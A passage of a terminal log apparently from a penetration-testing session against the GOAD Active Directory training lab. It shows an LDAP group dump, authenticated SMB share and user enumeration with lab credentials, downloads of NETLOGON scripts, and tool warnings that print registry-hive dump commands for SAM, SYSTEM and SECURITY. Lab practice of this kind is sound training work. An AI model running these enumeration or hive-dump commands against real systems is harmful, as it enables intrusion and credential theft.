 otocols (such as WS-Management via the Windows Remote Management service). Th  
 is applies only to WMI namespaces that grant access to the user.  
distinguishedName: CN=Remote Management Users,CN=Builtin,DC=north,DC=sevenking  
 doms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8236  
uSNChanged: 8236  
name: Remote Management Users  
objectGUID:: \+/7dQwpIrESvD3a1w9zQzg==  
objectSid:: AQIAAAAAAAUgAAAARAIAAA==  
sAMAccountName: Remote Management Users  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Storage Replica Administrators, Builtin, north.sevenkingdoms.local  
dn: CN=Storage Replica Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=  
 local  
objectClass: top  
objectClass: group  
cn: Storage Replica Administrators  
description: Members of this group have complete and unrestricted access to al  
 l features of Storage Replica.  
distinguishedName: CN=Storage Replica Administrators,CN=Builtin,DC=north,DC=se  
 venkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8237  
uSNChanged: 8237  
name: Storage Replica Administrators  
objectGUID:: z2+GjD8x6EmnCmaiEJhqsw==  
objectSid:: AQIAAAAAAAUgAAAARgIAAA==  
sAMAccountName: Storage Replica Administrators  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Server Operators, Builtin, north.sevenkingdoms.local  
dn: CN=Server Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Server Operators  
description: Members can administer domain servers  
distinguishedName: CN=Server Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC  
 \=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413164658.0Z  
uSNCreated: 12330  
uSNChanged: 13651  
name: Server Operators  
objectGUID:: a5xoCwJGcUafSx9cGWRPIg==  
objectSid:: AQIAAAAAAAUgAAAAJQIAAA==  
adminCount: 1  
sAMAccountName: Server Operators  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z

\# Account Operators, Builtin, north.sevenkingdoms.local  
dn: CN=Account Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Account Operators  
description: Members can administer domain user and group accounts  
distinguishedName: CN=Account Operators,CN=Builtin,DC=north,DC=sevenkingdoms,D  
 C=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413164658.0Z  
uSNCreated: 12333  
uSNChanged: 13650  
name: Account Operators  
objectGUID:: JRs8qlHRN0SWb5D8acUKBw==  
objectSid:: AQIAAAAAAAUgAAAAJAIAAA==  
adminCount: 1  
sAMAccountName: Account Operators  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z

\# Pre-Windows 2000 Compatible Access, Builtin, north.sevenkingdoms.local  
dn: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=north,DC=sevenkingdoms  
 ,DC=local  
objectClass: top  
objectClass: group  
cn: Pre-Windows 2000 Compatible Access  
description: A backward compatibility group which allows read access on all us  
 ers and groups in the domain  
member: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=  
 local  
distinguishedName: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=north,D  
 C=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12336  
uSNChanged: 12356  
name: Pre-Windows 2000 Compatible Access  
objectGUID:: D2yW40I0tUibsel8GdKLPg==  
objectSid:: AQIAAAAAAAUgAAAAKgIAAA==  
sAMAccountName: Pre-Windows 2000 Compatible Access  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Windows Authorization Access Group, Builtin, north.sevenkingdoms.local  
dn: CN=Windows Authorization Access Group,CN=Builtin,DC=north,DC=sevenkingdoms  
 ,DC=local  
objectClass: top  
objectClass: group  
cn: Windows Authorization Access Group  
description: Members of this group have access to the computed tokenGroupsGlob  
 alAndUniversal attribute on User objects  
member: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=l  
 ocal  
distinguishedName: CN=Windows Authorization Access Group,CN=Builtin,DC=north,D  
 C=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12339  
uSNChanged: 12359  
name: Windows Authorization Access Group  
objectGUID:: 8igksuM2CUGDke/+UP7YFA==  
objectSid:: AQIAAAAAAAUgAAAAMAIAAA==  
sAMAccountName: Windows Authorization Access Group  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Terminal Server License Servers, Builtin, north.sevenkingdoms.local  
dn: CN=Terminal Server License Servers,CN=Builtin,DC=north,DC=sevenkingdoms,DC  
 \=local  
objectClass: top  
objectClass: group  
cn: Terminal Server License Servers  
description: Members of this group can update user accounts in Active Director  
 y with information about license issuance, for the purpose of tracking and re  
 porting TS Per User CAL usage  
distinguishedName: CN=Terminal Server License Servers,CN=Builtin,DC=north,DC=s  
 evenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12342  
uSNChanged: 12344  
name: Terminal Server License Servers  
objectGUID:: SGVKP/8N7U+kh76VyJywyg==  
objectSid:: AQIAAAAAAAUgAAAAMQIAAA==  
sAMAccountName: Terminal Server License Servers  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Administrators, Builtin, north.sevenkingdoms.local  
dn: CN=Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Administrators  
description: Administrators have complete and unrestricted access to the compu  
 ter/domain  
member: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=Enterprise Admins,CN=Users,DC=sevenkingdoms,DC=local  
member: CN=Domain Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=cloudbase-init,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
distinguishedName: CN=Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=l  
 ocal  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413171938.0Z  
uSNCreated: 8201  
uSNChanged: 17158  
name: Administrators  
objectGUID:: jwCJIiG8YE+6zTYNfBfa1Q==  
objectSid:: AQIAAAAAAAUgAAAAIAIAAA==  
adminCount: 1  
sAMAccountName: Administrators  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z

\# Users, Builtin, north.sevenkingdoms.local  
dn: CN=Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Users  
description: Users are prevented from making accidental or intentional system-  
 wide changes and can run most applications  
member: CN=Domain Users,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=  
 local  
member: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=l  
 ocal  
member: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
distinguishedName: CN=Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 8206  
uSNChanged: 12348  
name: Users  
objectGUID:: nulNSFBEnEmw+dvxSW9BSA==  
objectSid:: AQIAAAAAAAUgAAAAIQIAAA==  
sAMAccountName: Users  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Guests, Builtin, north.sevenkingdoms.local  
dn: CN=Guests,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Guests  
description: Guests have the same access as members of the Users group by defa  
 ult, except for the Guest account which is further restricted  
member: CN=Domain Guests,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=Guest,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
distinguishedName: CN=Guests,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 8213  
uSNChanged: 12350  
name: Guests  
objectGUID:: r4hWmb3U7UOIlbjouQdGWw==  
objectSid:: AQIAAAAAAAUgAAAAIgIAAA==  
sAMAccountName: Guests  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Print Operators, Builtin, north.sevenkingdoms.local  
dn: CN=Print Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Print Operators  
description: Members can administer printers installed on domain controllers  
distinguishedName: CN=Print Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=  
 local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413164658.0Z  
uSNCreated: 8216  
uSNChanged: 13657  
name: Print Operators  
objectGUID:: qPUl2r1b50O+OHerpHewBw==  
objectSid:: AQIAAAAAAAUgAAAAJgIAAA==  
adminCount: 1  
sAMAccountName: Print Operators  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z

\# Backup Operators, Builtin, north.sevenkingdoms.local  
dn: CN=Backup Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Backup Operators  
description: Backup Operators can override security restrictions for the sole   
 purpose of backing up or restoring files  
distinguishedName: CN=Backup Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC  
 \=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413164658.0Z  
uSNCreated: 8217  
uSNChanged: 13659  
name: Backup Operators  
objectGUID:: 3R+ODWnMMUSnC70o5gRVsw==  
objectSid:: AQIAAAAAAAUgAAAAJwIAAA==  
adminCount: 1  
sAMAccountName: Backup Operators  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z

\# search reference  
ref: ldap://DomainDnsZones.north.sevenkingdoms.local/DC=DomainDnsZones,DC=nort  
 h,DC=sevenkingdoms,DC=local

\# search result  
search: 2  
result: 0 Success

\# numResponses: 266  
\# numEntries: 264  
\# numReferences: 1  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ ldapsearch \-x \-H ldap://192.168.20.22 \-D "jon.snow@north.sevenkingdoms.local" \-w iknownothing \-b "dc=north,dc=sevenkingdoms,dc=local"  
ldap\_sasl\_bind(SIMPLE): Can't contact LDAP server (-1)  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.22/all \-U jon.snow  
do\_connect: Connection to 192.168.20.22 failed (Error NT\_STATUS\_IO\_TIMEOUT)  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.22/ADMIN$ \-U jon.snow

Password for \[WORKGROUP\\jon.snow\]:  
tree connect failed: NT\_STATUS\_ACCESS\_DENIED  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.22/C$ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:  
tree connect failed: NT\_STATUS\_ACCESS\_DENIED  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.22/public \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:  
Try "help" to get a list of possible commands.  
smb: \\\> ls  
NT\_STATUS\_ACCESS\_DENIED listing \\\*  
smb: \\\> ^C  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.22 \-u jon.snow \-p iknownothing \--shares  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.22   445    CASTELBLACK      \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)  
SMB         192.168.20.22   445    CASTELBLACK      \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.22   445    CASTELBLACK      \[+\] Enumerated shares  
SMB         192.168.20.22   445    CASTELBLACK      Share           Permissions     Remark  
SMB         192.168.20.22   445    CASTELBLACK      \-----           \-----------     \------  
SMB         192.168.20.22   445    CASTELBLACK      ADMIN$                          Remote Admin  
SMB         192.168.20.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all  
SMB         192.168.20.22   445    CASTELBLACK      C$                              Default share  
SMB         192.168.20.22   445    CASTELBLACK      IPC$            READ            Remote IPC  
SMB         192.168.20.22   445    CASTELBLACK      public          READ            Basic Read share for all domain users  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.22 \-u jon.snow \-p iknownothing \--sessions  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.22   445    CASTELBLACK      \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)  
SMB         192.168.20.22   445    CASTELBLACK      \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.22   445    CASTELBLACK      \[+\] Enumerated sessions  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.22 \-u jon.snow \-p iknownothing \--users  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.22   445    CASTELBLACK      \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)  
SMB         192.168.20.22   445    CASTELBLACK      \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.22   445    CASTELBLACK      \[-\] Error enumerating domain users using dc ip 192.168.20.22: socket connection error while opening: \[Errno 111\] Connection refused  
SMB         192.168.20.22   445    CASTELBLACK      \[\*\] Trying with SAMRPC protocol  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.22 \-u jon.snow \-p iknownothing \--groups  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.22   445    CASTELBLACK      \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)  
SMB         192.168.20.22   445    CASTELBLACK      \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.22   445    CASTELBLACK      \[-\] Error enumerating domain group using dc ip 192.168.20.22: socket connection error while opening: \[Errno 111\] Connection refused  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ enum4linux \-a 192.168.20.22  
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Aug 26 16:34:53 2025

 \=========================================( Target Information )=========================================  
                                                                                                                                                     
Target ........... 192.168.20.22                                                                                                                     
RID Range ........ 500-550,1000-1050  
Username ......... ''  
Password ......... ''  
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 \===========================( Enumerating Workgroup/Domain on 192.168.20.22 )===========================  
                                                                                                                                                     
                                                                                                                                                     
\[E\] Can't find workgroup/domain                                                                                                                      
                                                                                                                                                     
                                                                                                                                                   

 \===============================( Nbtstat Information for 192.168.20.22 )===============================  
                                                                                                                                                     
Looking up status of 192.168.20.22                                                                                                                   
No reply from 192.168.20.22

 \===================================( Session Check on 192.168.20.22 )===================================  
                                                                                                                                                     
                                                                                                                                                     
\[E\] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.                                                       
                                                                                                                                                     
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.11/NETLOGON \-U jon.snow                       
Password for \[WORKGROUP\\jon.snow\]:  
Try "help" to get a list of possible commands.  
smb: \\\> ls  
  .                                   D        0  Sun Apr 13 19:13:32 2025  
  ..                                  D        0  Sun Apr 13 19:13:32 2025  
  script.ps1                          A      165  Sun Apr 13 19:13:29 2025  
  secret.ps1                          A      869  Sun Apr 13 19:13:31 2025

                10485247 blocks of size 4096\. 7456501 blocks available  
smb: \\\> get script.ps1  
getting file \\script.ps1 of size 165 as script.ps1 (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)  
smb: \\\> get secret.ps1  
getting file \\secret.ps1 of size 869 as secret.ps1 (10.6 KiloBytes/sec) (average 6.5 KiloBytes/sec)  
smb: \\\> cd  
Current directory is \\  
smb: \\\> ^C  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ allinfo .  
allinfo: command not found  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.22 \-u samwell.tarly \-p Heartsbane \--shares  
smbclient //192.168.20.22/all \-U samwell.tarly  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.22   445    CASTELBLACK      \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)  
SMB         192.168.20.22   445    CASTELBLACK      \[+\] north.sevenkingdoms.local\\samwell.tarly:Heartsbane   
SMB         192.168.20.22   445    CASTELBLACK      \[+\] Enumerated shares  
SMB         192.168.20.22   445    CASTELBLACK      Share           Permissions     Remark  
SMB         192.168.20.22   445    CASTELBLACK      \-----           \-----------     \------  
SMB         192.168.20.22   445    CASTELBLACK      ADMIN$                          Remote Admin  
SMB         192.168.20.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all  
SMB         192.168.20.22   445    CASTELBLACK      C$                              Default share  
SMB         192.168.20.22   445    CASTELBLACK      IPC$            READ            Remote IPC  
SMB         192.168.20.22   445    CASTELBLACK      public          READ            Basic Read share for all domain users  
Password for \[WORKGROUP\\samwell.tarly\]:  
Try "help" to get a list of possible commands.  
smb: \\\> ls  
  .                                   D        0  Tue Aug 26 16:43:38 2025  
  ..                                  D        0  Tue Aug 26 16:43:38 2025  
  arya.txt                            A      413  Sun Apr 13 19:13:30 2025

                10485247 blocks of size 4096\. 6152243 blocks available  
smb: \\\> get arya.txt  
getting file \\arya.txt of size 413 as arya.txt (5.3 KiloBytes/sec) (average 5.3 KiloBytes/sec)  
smb: \\\> ls  
  .                                   D        0  Tue Aug 26 16:43:38 2025  
  ..                                  D        0  Tue Aug 26 16:43:38 2025  
